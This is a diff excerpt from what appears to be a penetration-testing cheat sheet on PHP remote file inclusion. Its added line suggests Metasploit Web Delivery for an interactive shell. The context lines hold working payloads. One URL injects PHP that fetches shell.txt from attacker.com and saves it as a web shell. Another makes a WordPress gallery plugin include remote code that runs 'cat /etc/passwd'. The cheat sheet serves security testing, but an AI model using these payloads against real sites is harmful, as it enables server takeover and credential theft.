@@ -46,7 +46,8 @@ Exploitation examples:
 http://victim.com/i_dont_exist.php?code=<?php file_put_contents("shell.php", file_get_contents("http://attacker.com/shell.txt")) ?>
 http://10.0.17.147/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://10.0.17.145/test/test.txt? //test.txt contains <?php print system("cat /etc/passwd"); ?>
 ```
-When appending questionmark to the end of the payload, the remainder of the local PHP code is treated as a parameter to the RFI included code. Also try multiple questionmarks.
+When appending questionmark to the end of the payload, the remainder of the local PHP code is treated as a parameter to the RFI included code. Also try multiple questionmarks.  
+Metasploit Web Delivery could also be useful in order to get an interactive shell.
 
 
 File Upload
